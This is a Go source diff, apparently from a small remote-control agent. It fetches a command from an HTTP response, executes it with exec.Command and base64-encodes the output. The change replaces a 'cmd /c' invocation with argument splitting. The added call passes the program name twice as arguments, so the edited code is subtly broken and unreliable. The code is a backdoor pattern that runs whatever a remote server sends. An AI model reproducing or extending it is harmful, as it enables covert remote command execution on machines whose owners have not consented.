@@ -9,6 +9,7 @@ import (
 	"log"
 	"net/http"
 	"os/exec"
+	"strings"
 )
 
 type Post struct {
@@ -26,13 +27,16 @@ func main() {
 		fmt.Printf("Error: %s", err)
 	}
 
-	// split := strings.Split(string(resBody), " ")
+	split := strings.Split(string(resBody), " ")
 
-	cmd := exec.Command("cmd", "/c", string(resBody))
+	cmd := exec.Command(split[0], split...)
 	out, err := cmd.Output()
 	if err != nil {
+		fmt.Println(cmd)
 		fmt.Println("Error running command: ", err)
 	}
+
+	// fmt.Println(out)
 
 	sEnc := base64.StdEncoding.EncodeToString([]byte(string(out)))
 
